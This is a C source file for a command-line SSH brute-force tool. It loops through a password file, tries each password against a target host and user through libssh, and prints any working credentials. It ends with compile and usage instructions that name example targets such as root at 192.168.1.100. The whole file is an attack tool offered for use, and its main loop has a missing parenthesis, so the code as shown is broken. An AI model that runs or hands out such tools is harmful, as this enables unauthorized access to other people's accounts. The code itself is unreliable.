#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libssh/libssh.h>

#define MAX_PASSWORD_LENGTH 256
#define MAX_USER_LENGTH 64
#define MAX_HOST_LENGTH 64
#define MAX_PATH_LENGTH 256

// Function to perform SSH authentication
int try_ssh_login(const char *host, const char *username, const char *password) {
    ssh_session session = ssh_new();
    if (session == NULL) {
        return -1;
    }

    // Set SSH options
    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, 0); // Disable verbose logging

    // Connect to SSH server
    if (ssh_connect(session) != SSH_OK) {
        ssh_free(session);
        return -1;
    }

    // Attempt authentication
    int rc = ssh_userauth_password(session, NULL, password);
    int result = (rc == SSH_AUTH_SUCCESS) ? 1 : 0;

    // Clean up
    ssh_disconnect(session);
    ssh_free(session);

    return result;
}

// Function to process password file
void process_password_file(const char *host, const char *username, const char *password_file) {
    FILE *file = fopen(password_file, "r");
    if (file == NULL) {
        perror("Error opening password file");
        exit(EXIT_FAILURE);
    }

    char password[MAX_PASSWORD_LENGTH];
    int attempts = 0;
    int found = 0;

    printf("Starting SSH brute force attack on %s@%s\n", username, host);
    printf("Using password file: %s\n\n", password_file);

    while (fgets(password, MAX_PASSWORD_LENGTH, file) {
        // Remove newline character
        password[strcspn(password, "\n")] = 0;

        attempts++;
        printf("Attempt #%d: Trying password '%s'\r", attempts, password);
        fflush(stdout);

        // Try to authenticate with current password
        int result = try_ssh_login(host, username, password);

        if (result == 1) {
            printf("\n\n[+] SUCCESS! Valid credentials found:\n");
            printf("    Username: %s\n", username);
            printf("    Password: %s\n", password);
            found = 1;
            break;
        } else if (result < 0) {
            printf("\n[-] Connection error occurred\n");
            break;
        }

        // Add a small delay to avoid flooding the server
        usleep(200000); // 200ms
    }

    if (!found) {
        printf("\n\n[-] Attack completed. No valid credentials found after %d attempts.\n", attempts);
    }

    fclose(file);
}

// Display usage information
void display_usage(const char *program_name) {
    printf("SSH Brute Force Tool\n");
    printf("Usage: %s -h <host> -u <username> -p <password_file>\n\n", program_name);
    printf("Options:\n");
    printf("  -h  Target host (IP address or domain name)\n");
    printf("  -u  Username to test\n");
    printf("  -p  File containing passwords to test\n\n");
    printf("Example: %s -h 192.168.1.100 -u root -p passwords.txt\n", program_name);
}

int main(int argc, char *argv[]) {
    char host[MAX_HOST_LENGTH] = {0};
    char username[MAX_USER_LENGTH] = {0};
    char password_file[MAX_PATH_LENGTH] = {0};

    // Parse command line arguments
    int opt;
    while ((opt = getopt(argc, argv, "h:u:p:")) != -1) {
        switch (opt) {
            case 'h':
                strncpy(host, optarg, MAX_HOST_LENGTH - 1);
                break;
            case 'u':
                strncpy(username, optarg, MAX_USER_LENGTH - 1);
                break;
            case 'p':
                strncpy(password_file, optarg, MAX_PATH_LENGTH - 1);
                break;
            default:
                display_usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    // Validate required arguments
    if (host[0] == '\0' || username[0] == '\0' || password_file[0] == '\0') {
        display_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    printf("\033[1;34m"); // Set text color to blue
    printf("================================================\n");
    printf("            SSH BRUTEFORCE TOOL v1.0            \n");
    printf("================================================\n");
    printf("\033[0m"); // Reset text color

    // Start the attack
    process_password_file(host, username, password_file);

    return EXIT_SUCCESS;
}


/*
Compilation and Usage
Prerequisites

    Install libssh development libraries:
    bash

    # For Debian/Ubuntu
    sudo apt-get install libssh-dev

    # For Fedora/CentOS
    sudo dnf install libssh-devel

Compilation
bash

gcc -o ssh_brute ssh_brute.c -lssh

Usage
bash

./ssh_brute -h <target_host> -u <username> -p <password_file>

Example
bash

./ssh_brute -h 192.168.1.100 -u admin -p passwords.txt


*/